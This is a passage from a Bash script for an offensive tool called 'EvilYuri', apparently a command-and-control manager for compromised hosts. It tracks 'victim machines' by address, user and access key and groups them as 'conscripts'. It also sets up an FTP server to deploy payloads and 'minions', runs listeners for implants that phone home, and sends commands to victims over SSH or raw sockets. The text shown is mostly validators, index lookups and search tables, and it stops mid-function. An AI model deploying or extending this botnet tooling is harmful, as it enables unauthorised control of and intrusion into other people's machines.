#!/bin/bash
#
# Regards, the Alveare Solutions society,
#
# EVIL YURI

declare -A SYSTEM_COMMANDS
declare -A CONSCRIPT_COMMANDS

PROJECT_ROOT="`pwd`"
MINION_PATH=''
PAYLOAD_PATH=''
ACTION="mission-instruction"     # ('conscript-commander', 'setup-ftp', 'start-minion-listener', 'stop-minion-listener', 'deploy-minion', 'deploy-payload', 'register-conscript', 'group-conscripts', 'archive-conscripts', 'panic', 'interogate-conscripts', 'search-conscripts', 'mission-instruction', 'create-group', 'search-groups', 'search-archives', 'delete-group', 'delete-archive')
MISSION_INSTRUCTION=''           # [ Ex ]: echo -n "Conscript Reporting! - "; date +%D-%T; whoami; uname -a
PANIC_FLAG='off'                 # (on | off)
FOREGROUND_FLAG='off'            # (on | off)
PAPER_TRAIL_FLAG='off'           # (on | off)
PORT_NUMBER=''
VICTIM_USER=''
VICTIM_KEY=''
PROTOCOL='ssh'                   # (ssh | raw)
TARGET='all'                     # (all | group | specific | attribute)
DEPRECATED_ARCHIVE=''
SEARCH_CRITERIA='identifier'     # (identifier | address | port | key | user | all | size | group)
FTP_CONF_TEMPLATE=''
FTP_SERVER_ADDRESS='127.0.0.1'
VICTIM_ADDRESSES=()
VICTIM_IDENTIFIERS=()
GROUP_LABELS=()

# COLD PARAMETERS

SCRIPT_NAME="EvilYuri"
VERSION='Electromancer'
VERSION_NO='1.0'
VICTIMS_PATH="${PROJECT_ROOT}/data/victim-machines"
CONSCRIPT_DIR="${VICTIMS_PATH}/conscripts"
REPORT_DIR="${PROJECT_ROOT}/data/paper-trail"
TEMPLATES_PATH="${PROJECT_ROOT}/data/templates"
GROUP_DIR="${VICTIMS_PATH}/groups"
ARCHIVE_DIR="${VICTIMS_PATH}/archives"
CONSCRIPT_INDEX="${VICTIMS_PATH}/conscripts.index"
GROUP_INDEX="${VICTIMS_PATH}/groups.index"
ARCHIVE_INDEX="${VICTIMS_PATH}/archives.index"
SSH_COMMAND_CARGO="${PROJECT_ROOT}/src/ssh-command.exp"
SSH_MACHINE_CARGO="${PROJECT_ROOT}/src/ssh-machine.exp"
RAW_LISTENER_CARGO="${PROJECT_ROOT}/src/raw-listener.sh"
RAW_TRANSCEIVER_CARGO="${PROJECT_ROOT}/src/raw-transceiver.sh"
MINION_CALL_LISTENER_LOG="${PROJECT_ROOT}/logs/Minion.log"
MINION_CALL_LISTENER_ANCHOR="${PROJECT_ROOT}/data/.minion-phone-home"
MINION_DIR_PATH="${PROJECT_ROOT}/minions"
PAYLOAD_DIR_PATH="${PROJECT_ROOT}/payloads"
FTP_PUBLIC_DIRECTORY="/var/EvilYuri"
CNX_TIMEOUT=5
DEPENDENCIES=(
'apt'
'wget'
'ncat'
'vsftpd'
)

# FETCHERS

function fetch_conscript_record_by_identifier () {
    local CONSCRIPT_ID="$1"
    local CRECORD=`awk -F, -v conscript_id="$CONSCRIPT_ID" 'BEGIN { OFS="," }
        $1 !~ "#" && $1 == conscript_id { print }' "$CONSCRIPT_INDEX"`
    echo "$CRECORD"
    return $?
}

function fetch_group_record_by_label () {
    local GROUP_LABEL="$1"
    awk -F, -v group_lbl="$GROUP_LABEL" \
        '$1 !~ "#" && $1 == group_lbl' "$GROUP_INDEX"
    return $?
}

function fetch_all_grouped_conscript_records () {
    CONSCRIPT_RECORDS=( `fetch_registered_conscript_records` )
    if [ ${#CONSCRIPT_RECORDS[@]} -eq 0 ]; then
        echo "[ WARNING ]: No conscripts registered."
        return 1
    fi
    local HAS_GROUP=()
    for conscript_record in ${CONSCRIPT_RECORDS[@]}; do
        CGROUP=`echo "$conscript_record" | awk -F, '{ print $7 }'`
        if [ $? -ne 0 ] || [ -z "$CGROUP" ]; then
            continue
        fi
        local HAS_GROUP=( ${HAS_GROUP[@]} "$conscript_record" )
    done
    echo "${HAS_GROUP[@]}"
    return $?
}

function fetch_conscript_group () {
    local CONSCRIPT_ID="$1"
    local CRECORD=`awk -F, -v conscript_id="$CONSCRIPT_ID" \
        '$1 == conscript_id' "$CONSCRIPT_INDEX"`
    if [ -z "$CRECORD" ]; then
        return 1
    fi
    CGROUP=`echo "$CRECORD" | awk -F, '{ print $7 }'`
    if [ -z "$CGROUP" ]; then
        return 2
    fi
    echo "$CGROUP"
    return 0
}

function fetch_group_membership_records () {
    local GROUP_LBL="$1"
    MEMBER_RECORDS=(
        `awk -F, -v group_label="$GROUP_LBL" '$7 == group_label' \
            ${CONSCRIPT_INDEX}`
    )
    if [ ${#MEMBER_RECORDS[@]} -eq 0 ]; then
        return 1
    fi
    echo ${MEMBER_RECORDS[@]}
    return $?
}

function fetch_registered_conscript_records () {
    REGISTERED_CONSCRIPT_RECORDS=(
        `awk -F, '! /^\s{0,}#/ {print $0}' "$CONSCRIPT_INDEX"`
    )
    echo ${REGISTERED_CONSCRIPT_RECORDS[@]}
    return $?
}

function fetch_registered_conscript_identifiers () {
    REGISTERED_CONSCRIPT_IDS=(
        `awk -F, '! /^\s{0,}#/ {print $1}' "$CONSCRIPT_INDEX"`
    )
    echo ${REGISTERED_CONSCRIPT_IDS[@]}
    return $?
}

# CHECKERS

function check_conscript_registered () {
    local CONSCRIPT_ID="$1"
    local LINE_NO=`awk -F, -v conscript_identifier="$CONSCRIPT_ID" \
        '$1 == conscript_identifier { print NR; exit 0 }' \
        "$CONSCRIPT_INDEX" 2> /dev/null`
    local EXIT_CODE=$?
    if [ -z "$LINE_NO" ]; then
        return 1
    fi
    return $EXIT_CODE
}

function check_action_issue_conscript_mission_instruction_data_set () {
    local VALIDATION_FAILURES=0
    validate_target "$TARGET"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid target detected!"
    fi
    validate_mission_instruction "$MISSION_INSTRUCTION"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid conscript mission instruction detected!"
    fi
    if [[ "$TARGET" == "all" ]]; then
        return 0
    elif [[ "$TARGET" == 'specific' ]]; then
        validate_group_labels ${GROUP_LABELS[@]}
        if [ $? -ne 0 ]; then
            local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
            echo "[ WARNING ]: Invalid conscript group detected!"
        fi
        validate_victim_addresses ${VICTIM_ADDRESSES[@]}
        if [ $? -ne 0 ]; then
            local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
            echo "[ WARNING ]: Invalid conscript address detected!"
        fi
        validate_port_number $PORT_NUMBER
        if [ $? -ne 0 ]; then
            local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
            echo "[ WARNING ]: Invalid port number detected!"
        fi
        validate_victim_user "$VICTIM_USER"
        if [ $? -ne 0 ]; then
            local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
            echo "[ WARNING ]: Invalid conscript system user detected!"
        fi
        validate_victim_key "$VICTIM_KEY"
        if [ $? -ne 0 ]; then
            local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
            echo "[ WARNING ]: Invalid conscript access key detected!"
        fi
    fi
    validate_group_labels ${GROUP_LABELS[@]}
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid conscript group detected!"
    fi
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid target resources"\
            "(conscript groups or IPv4 addresses) detected!"
    fi
    return $VALIDATION_FAILURES
}

function check_action_conscript_commander_data_set () {
    local VALIDATION_FAILURES=0
    validate_victim_identifiers ${VICTIM_IDENTIFIERS[@]}
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid conscript IDs detected!"
    fi
    return $VALIDATION_FAILURES
}

function check_ftp_conf_template_file_exists () {
    ${SYSTEM_COMMANDS['setup-ftp-conf']} &> /dev/null
    if [ $? -ne 0 ]; then
        echo "[ NOK ]: Could not set vsftpd config file template"\
            "($FTP_CONF_TEMPLATE) to (/etc/vsftpd.conf)"
        return 1
    fi
    echo "[ OK ]: FTP server config template file set!"\
        "($FTP_CONF_TEMPLATE -> /etc/vsftpd.conf)"
    return 0
}

function check_action_setup_ftp_data_set () {
    local VALIDATION_FAILURES=0
    validate_ftp_config_template "$FTP_CONF_TEMPLATE"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid configuration template file for payload"\
            "FTP server detected! ($FTP_CONF_TEMPLATE)"
    fi
    return $VALIDATION_FAILURES
}

function check_util_installed () {
    local UTIL_NAME="$1"
    type "$UTIL_NAME" &> /dev/null && return 0 || return 1
}

function check_foreground_flag () {
    case "$FOREGROUND_FLAG" in
        'on'|'On'|'ON')
            return 0
            ;;
        'off'|'Off'|'OFF')
            return 1
            ;;
    esac
    return 2
}

function check_action_delete_archive_data_set () {
    local VALIDATION_FAILURES=0
    validate_deprecated_archive "$DEPRECATED_ARCHIVE"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid deprecated conscript archive detected!"
    fi
    return $VALIDATION_FAILURES
}

function check_action_archive_conscripts_data_set () {
    local VALIDATION_FAILURES=0
    validate_target "$TARGET"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid target detected! ($TARGET)"
    fi
    validate_deprecated_archive "$DEPRECATED_ARCHIVE"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid archive detected! ($DEPRECATED_ARCHIVE)"
    fi
    validate_victim_identifiers "${VICTIM_IDENTIFIERS[@]}"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid conscript identifiers detected!"\
            "(${VICTIM_IDENTIFIERS[@]})"
    fi
    return $VALIDATION_FAILURES
}

function check_action_group_conscripts_data_set () {
    local VALIDATION_FAILURES=0
    validate_target "$TARGET"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid target detected! ($TARGET)"
    fi
    validate_group_labels ${GROUP_LABELS[@]}
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid conscript group labels detected! ($TARGET)"
    fi
    return $VALIDATION_FAILURES
}

function check_action_rebase_conscripts_data_set () {
    local VALIDATION_FAILURES=0
    validate_victim_identifiers ${VICTIM_IDENTIFIERS[@]}
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid conscript identifiers detected!"
    fi
    return $VALIDATION_FAILURES
}

function check_action_search_groups_data_set () {
    local VALIDATION_FAILURES=0
    validate_file "$GROUP_INDEX"
    if [ $? -ne 0 ]; then
        echo "[ WARNING ]: Invalid group index file! ($GROUP_INDEX)"
        return 1
    fi
    validate_search_criteria "$SEARCH_CRITERIA"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid search criteria detected!"
    fi
    if [[ "$SEACH_CRITERIA" == 'all' ]]; then
        return $VALIDATION_FAILURES
    fi
    if [[ "$SEACH_CRITERIA" == 'identifier' ]]; then
        validate_group_labels ${GROUP_LABELS[@]}
        if [ $? -ne 0 ]; then
            local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
            echo "[ WARNING ]: Invalid group identifiers detected!"
        fi
    fi
    return $VALIDATION_FAILURES
}

function check_action_search_archives_data_set () {
    local VALIDATION_FAILURES=0
    validate_file "$ARCHIVE_INDEX"
    if [ $? -ne 0 ]; then
        echo "[ WARNING ]: Invalid archive index file! ($ARCHIVE_INDEX)"
        return 1
    fi
    validate_search_criteria "$SEARCH_CRITERIA"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid search criteria detected!"
    fi
    if [[ "$SEACH_CRITERIA" == 'all' ]]; then
        return $VALIDATION_FAILURES
    fi
    if [[ "$SEACH_CRITERIA" == 'identifier' ]]; then
        validate_deprecated_archive "$DEPRECATED_ARCHIVE"
        if [ $? -ne 0 ]; then
            local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
            echo "[ WARNING ]: Invalid group identifiers detected!"
        fi
    fi
    return $VALIDATION_FAILURES
}

function check_group_exists () {
    local GROUP_LABEL="$1"
    GRECORD=`fetch_group_record_by_label "$GROUP_LABEL"`
    if [ $? -ne 0 ] || [ -z "$GRECORD" ]; then
        return 1
    fi
    return 0
}

function check_conscript_grouped () {
    local CONSCRIPT_ID="$1"
    CGROUP=`fetch_conscript_group "$CONSCRIPT_ID"`
    if [ -z "$CGROUP" ]; then
        return 1
    fi
    echo "$CGROUP"
    return 0
}

function check_conscript_unregistered () {
    local CONSCRIPT_LABEL="$1"
    REGISTERED_CONSCRIPTS=( `fetch_registered_conscript_identifiers` )
    check_item_in_set "$CONSCRIPT_LABEL" ${REGISTERED_CONSCRIPTS[@]}
    if [ $? -eq 0 ]; then
        return 1
    fi
    return 0
}

function check_item_in_set () {
    local ITEM="$1"
    ITEM_SET=( "${@:2}" )
    for SET_ITEM in "${ITEM_SET[@]}"; do
        if [[ "$ITEM" == "$SET_ITEM" ]]; then
            return 0
        fi
    done
    return 1
}

function check_action_create_group_data_set () {
    local VALIDATION_FAILURES=0
    validate_group_labels ${GROUP_LABELS[@]}
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid group labels detected!"
    fi
    return $VALIDATION_FAILURES
}

function check_action_register_conscript_data_set () {
    local VALIDATION_FAILURES=0
    validate_protocol "$PROTOCOL"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid protocol detected!"
    fi
    validate_victim_addresses ${VICTIM_ADDRESSES[@]}
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid victim addresses detected!"
    fi
    validate_port_number $PORT_NUMBER
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid port number detected!"
    fi
    validate_victim_user "$VICTIM_USER"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid victim user detected!"
    fi
    validate_victim_identifiers "${VICTIM_IDENTIFIERS[@]}"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid victim identifiers detected!"
    fi
    return $VALIDATION_FAILURES
}

function check_action_search_conscripts_data_set () {
    local VALIDATION_FAILURES=0
    validate_file "$CONSCRIPT_INDEX"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid conscript index file! ($CONSCRIPT_INDEX)"
    fi
    validate_search_criteria "$SEARCH_CRITERIA"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid search criteria detected!"
    fi
    case "$SEARCH_CRITERIA" in
        'all')
            return $VALIDATION_FAILURES
            ;;
        'identifier')
            validate_victim_identifiers ${VICTIM_IDENTIFIERS[@]}
            if [ $? -ne 0 ]; then
                local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
                echo "[ WARNING ]: Invalid victim identifiers detected!"
            fi
            ;;
        'group')
            validate_group_labels ${GROUP_LABELS[@]}
            if [ $? -ne 0 ]; then
                local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
                echo "[ WARNING ]: Invalid group labels detected!"
            fi
            ;;
        'address')
            validate_victim_addresses ${VICTIM_ADDRESSES[@]}
            if [ $? -ne 0 ]; then
                local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
                echo "[ WARNING ]: Invalid victim addresses detected!"
            fi
            ;;
        'port')
            validate_port_number $PORT_NUMBER
            if [ $? -ne 0 ]; then
                local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
                echo "[ WARNING ]: Invalid port number detected!"
            fi
            ;;
        'user')
            validate_victim_user "$VICTIM_USER"
            if [ $? -ne 0 ]; then
                local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
                echo "[ WARNING ]: Invalid victim user detected!"
            fi
            ;;
        'key')
            validate_victim_key "$VICTIM_KEY"
            if [ $? -ne 0 ]; then
                local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
                echo "[ WARNING ]: Invalid victim key detected!"
            fi
            ;;

    esac
    return $VALIDATION_FAILURES
}

function check_action_interogate_conscripts_for_updates_data_set () {
    local VALIDATION_FAILURES=0
    validate_target "$TARGET"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid target detected!"
    fi
    validate_victim_addresses ${VICTIM_ADDRESSES[@]}
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid victim address detected!"
    fi
    validate_port_number $PORT_NUMBER
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid port number detected!"
    fi
    validate_victim_user "$VICTIM_USER"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid victim user detected!"
    fi
    validate_victim_key "$VICTIM_KEY"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid victim key detected!"
    fi
    return $VALIDATION_FAILURES
}

function check_action_panic_data_set () {
    local VALIDATION_FAILURES=0
    validate_project_root "$PROJECT_ROOT"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid project root directory path detected!"\
            "($PROJECT_ROOT)"
    fi
    return $VALIDATION_FAILURES
}

function check_action_deploy_payload_to_victim_machine_data_set () {
    local VALIDATION_FAILURES=0
    validate_protocol "$PROTOCOL"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid protocol detected!"
    fi
    validate_target "$TARGET"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid target detected!"
    fi
    validate_victim_addresses "${VICTIM_ADDRESSES[@]}"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid conscript IPv4 addresses detected!"
    fi
    validate_port_number $PORT_NUMBER
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid port number detected!"
    fi
    validate_victim_user "$VICTIM_USER"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid conscript system user detected!"
    fi
    validate_payload_path "$PAYLOAD_PATH"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid payload path detected!"
    fi
    validate_ftp_server_address "$FTP_SERVER_ADDRESS"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid payload FTP server address detected!"
    fi
    return $VALIDATION_FAILURES
}

function check_action_deploy_minion_to_victim_machine_data_set () {
    local VALIDATION_FAILURES=0
    validate_protocol "$PROTOCOL"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid protocol detected!"
    fi
    validate_target "$TARGET"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid target detected!"
    fi
    validate_victim_addresses ${VICTIM_ADDRESSES[@]}
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid conscript IPv4 addresses detected!"
    fi
    validate_victim_key "$VICTIM_KEY"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid conscript access key detected!"
    fi
    validate_minion_path "$MINION_PATH"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid Evul Yuri Minion path detected!"
    fi
    validate_ftp_server_address "$FTP_SERVER_ADDRESS"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid payload FTP server address detected!"
    fi
    return $VALIDATION_FAILURES
}

function check_action_stop_minion_call_listener_data_set () {
    local VALIDATION_FAILURES=0
    validate_protocol "$PROTOCOL"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid protocol detected!"
    fi
    validate_port_number $PORT_NUMBER
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid port number detected!"
    fi
    return $VALIDATION_FAILURES
}

function check_action_start_minion_call_listener_data_set () {
    local VALIDATION_FAILURES=0
    validate_protocol "$PROTOCOL"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid protocol detected!"
    fi
    validate_port_number $PORT_NUMBER
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid port number detected!"
    fi
    validate_foreground_flag "$FOREGROUND_FLAG"
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid foreground flag detected!"
    fi
    return $VALIDATION_FAILURES
}

function check_action_delete_group_data_set () {
    local VALIDATION_FAILURES=0
    validate_group_labels ${GROUP_LABELS[@]}
    if [ $? -ne 0 ]; then
        local VALIDATION_FAILURES=$((VALIDATION_FAILURES + 1))
        echo "[ WARNING ]: Invalid conscript group labels detected!"
    fi
    return $VALIDATION_FAILURES
}

# VALIDATORS

function validate_ftp_server_address () {
    local ADDR="$1"
    if [ -z "$ADDR" ]; then
        return 1
    fi
    return 0
}

function validate_ftp_config_template () {
    local FILE_PATH="$1"
    if [ ! -f "$FILE_PATH" ]; then
        return 1
    fi
    return 0
}

function validate_file () {
    local FILE_PATH="$1"
    if [ ! -f "$FILE_PATH" ]; then
        return 1
    fi
    return 0
}

function validate_directory () {
    local DIR_PATH="$1"
    if [ ! -f "$DIR_PATH" ]; then
        return 1
    fi
    return 0
}

function validate_victim_key () {
    local VALIDATE="$1"
    if [ -z "$VALIDATE" ]; then
        return 1
    fi
    return 0
}

function validate_project_root () {
    local VALIDATE="$1"
    if [ -z "$VALIDATE" ]; then
        return 1
    fi
    return 0
}

function validate_minion_path () {
    local VALIDATE="$1"
    if [ -z "$VALIDATE" ]; then
        return 1
    fi
    return 0
}

function validate_payload_path () {
    local VALIDATE="$1"
    if [ -z "$VALIDATE" ]; then
        return 1
    fi
    return 0
}

function validate_mission_instruction () {
    local VALIDATE="$@"
    if [ -z "$VALIDATE" ]; then
        return 1
    fi
    return 0
}

function validate_panic_flag () {
    local VALIDATE="$1"
    if [ -z "$VALIDATE" ] \
            || [[ "$VALIDATE" != 'on' ]] \
            && [[ "$VALIDATE" != 'off' ]]; then
        return 1
    fi
    return 0
}

function validate_foreground_flag () {
    local VALIDATE="$1"
    if [ -z "$VALIDATE" ] \
            || [[ "$VALIDATE" != 'on' ]] \
            && [[ "$VALIDATE" != 'off' ]]; then
        return 1
    fi
    return 0
}

function validate_port_number () {
    local VALIDATE=$1
    if [ -z "$VALIDATE" ]; then
        return 1
    fi
    test $VALIDATE -eq $VALIDATE &> /dev/null
    if [ $? -ne 0 ]; then
        return 2
    fi
    return 0
}

function validate_victim_user () {
    local VALIDATE="$1"
    if [ -z "$VALIDATE" ]; then
        return 1
    fi
    return 0
}

function validate_protocol () {
    local VALIDATE="$1"
    if [ -z "$VALIDATE" ] \
            || [[ "$VALIDATE" != 'ssh' ]] \
            && [[ "$VALIDATE" != 'raw' ]] \
            && [[ "$VALIDATE" != 'http' ]]; then
        return 1
    fi
    return 0
}

function validate_target () {
    local VALIDATE="$1"
    if [ -z "$VALIDATE" ] \
            || [[ "$VALIDATE" != 'all' ]] \
            && [[ "$VALIDATE" != 'group' ]] \
            && [[ "$VALIDATE" != 'attribute' ]] \
            && [[ "$VALIDATE" != 'specific' ]]; then
        return 1
    fi
    return 0
}

function validate_deprecated_archive () {
    local VALIDATE="$1"
    if [ -z "$VALIDATE" ]; then
        return 1
    fi
    return 0
}

function validate_search_criteria () {
    local VALIDATE="$1"
    if [ -z "$VALIDATE" ] \
            || [[ "$VALIDATE" != 'identifier' ]] \
            && [[ "$VALIDATE" != 'all' ]] \
            && [[ "$VALIDATE" != 'address' ]] \
            && [[ "$VALIDATE" != 'port' ]] \
            && [[ "$VALIDATE" != 'key' ]] \
            && [[ "$VALIDATE" != 'user' ]]; then
        return 1
    fi
    return 0
}

function validate_victim_addresses () {
    local VALIDATE=( $@ )
    if [ ${#VALIDATE[@]} -eq 0 ]; then
        return 1
    fi
    return 0
}

function validate_victim_identifiers () {
    local VALIDATE=( $@ )
    if [ ${#VALIDATE[@]} -eq 0 ]; then
        return 1
    fi
    return 0
}

function validate_group_labels () {
    VALIDATE=( $@ )
    if [ ${#VALIDATE[@]} -eq 0 ]; then
        return 1
    fi
    return 0
}

# UNLINKERS

function unlink_conscripts_from_groups () {
    local CRECORDS=( $@ )
    local FAILURE_COUNT=0
    for conscript_record in ${CRECORDS[@]}; do
        local CID=`echo "$conscript_record" | awk -F, '{ print $1 }'`
        local CGROUP=`awk -F, -v conscript_id="$CID" \
            'BEGIN { OFS="," } $1 !~ "#" && $1 == conscript_id { print $7 }' \
            "$CONSCRIPT_INDEX"`
        remove_conscript_from_group "$CID" "$CGROUP"
        if [ $? -ne 0 ]; then
            local FAILURE_COUNT=$((FAILURE_COUNT + 1))
            echo "[ NOK ]: Could not remove conscript (${CID})"\
                "from group (${CGROUP})."
            continue
        fi
        echo "[ OK ]: Removed conscript (${CID}) from group (${CGROUP})."
    done
    return $FAILURE_COUNT
}

# SEARCHERS

function search_all_groups () {
    awk -F, \
    'BEGIN {
        printf " _______________________________________________________________________________________\n\n"
        printf " %-19s%14s\n", "Identifier", "Size"
        printf " _______________________________________________________________________________________\n"
    }
    $1 !~ "#" && $0 !~ "^$" { printf " %-19s%13s\n", $1, $2 }
    END {
        print ""
    }' "$GROUP_INDEX"
    return $?
}

function search_groups_by_identifier () {
    awk -F, \
    'BEGIN {
        printf " _______________________________________________________________________________________\n\n"
        printf " %-19s%14s\n", "Identifier", "Size"
        printf " _______________________________________________________________________________________\n"
    }'
    for group_label in ${GROUP_LABELS[@]}; do
        awk -F, -v group_label="$group_label" \
        '$1 !~ "#" && $1 == group_label { printf " %-19s%13s\n", $1, $2 }
        END {
            print ""
        }' "$GROUP_INDEX"

    done
    return $?
}

function search_all_archived_conscripts () {
    awk -F, \
    'BEGIN {
        printf " ____________________________________________________________________________________________________________________\n\n"
        printf " %s%15s%11s%12s%12s%22s%17s%17s\n", "Identifier", "Address", "Port", "Protocol", "User", "Access Key", "Group", "Archive"
        printf " ____________________________________________________________________________________________________________________\n"
    }
    $1 !~ "#" && $0 !~ "^$" { printf " %s%15s%10s%10s%18s%22s\n", $1, $2, $3, $4, $5, $6, $7, $8 }
    END {
        print ""
    }' "$ARCHIVE_INDEX"
    return $?
}

function search_archived_conscripts_by_identifier () {
    awk -F, \
    'BEGIN {
        printf " ____________________________________________________________________________________________________________________\n\n"
        printf " %s%15s%11s%12s%12s%22s%17s%17s\n", "Identifier", "Address", "Port", "Protocol", "User", "Access Key", "Group", "Archive"
        printf " ____________________________________________________________________________________________________________________\n"
    }'
    for conscript_id in ${VICTIM_IDENTIFIERS[@]}; do
        awk -F, -v conscript_id="$conscript_id" \
        '$1 !~ "#" && $1 == conscript_id { printf " %s%15s%10s%10s%18s%22s\n", $1, $2, $3, $4, $5, $6, $7, $8 }
        END {
            print ""
        }' "$ARCHIVE_INDEX"
    done
    return $?
}

function search_all_conscripts () {
    if [ -z "`cat $CONSCRIPT_INDEX | grep -v '^#'`" ]; then
        echo "[ WARNING ]: No conscript records found!"
        return 1
    fi
    awk -F, \
    'BEGIN {
        printf " ____________________________________________________________________________________________________________\n\n"
        printf " %s%15s%11s%12s%12s%22s%20s\n", "Identifier", "Address", "Port", "Protocol", "User", "Access Key", "Group"
        printf " ____________________________________________________________________________________________________________\n"
    }
    $1 !~ "#" && $0 !~ "^$" { printf " %s%15s%10s%10s%18s%22s%22s\n", $1, $2, $3, $4, $5, $6, $7 }
    END {
